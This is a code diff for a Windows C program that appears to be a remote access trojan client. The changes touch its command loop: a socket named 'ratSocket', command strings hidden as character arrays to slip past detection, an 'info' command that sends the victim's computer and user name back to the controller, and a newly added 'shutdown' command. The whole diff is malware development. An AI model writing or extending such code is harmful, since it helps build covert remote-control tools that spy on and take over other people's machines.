@@ -143,7 +143,7 @@ WinMain(HINSTANCE hInstance,
 		
 		OutputDebugStringA("Received command: ");
 		char ca_info[] = { 'i','n','f','o',0 };
-		char ca_info[] = { 's','h','u','t','d','o','w','n',0 };
+		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
 		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
 			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
@@ -184,9 +184,17 @@ WinMain(HINSTANCE hInstance,
 			sprintf(bufferInfo, "%s:%s", bufferComputer, bufferUser);
 			SocketSend(&ratSocket, bufferInfo);
 		}
+		else if ( strcmp(recvBuffer, ca_shutdown) == 0 )
+		{
+			OutputDebugStringA("Received shutdown command.\n");
+			break;
+		}
 		else
 		{
+			OutputDebugStringA("[WARNING] Unrecognized command: ");
 			OutputDebugStringA(recvBuffer);
+			OutputDebugStringA("\n");
+			
 			break;
 		}
 		OutputDebugStringA("\n");
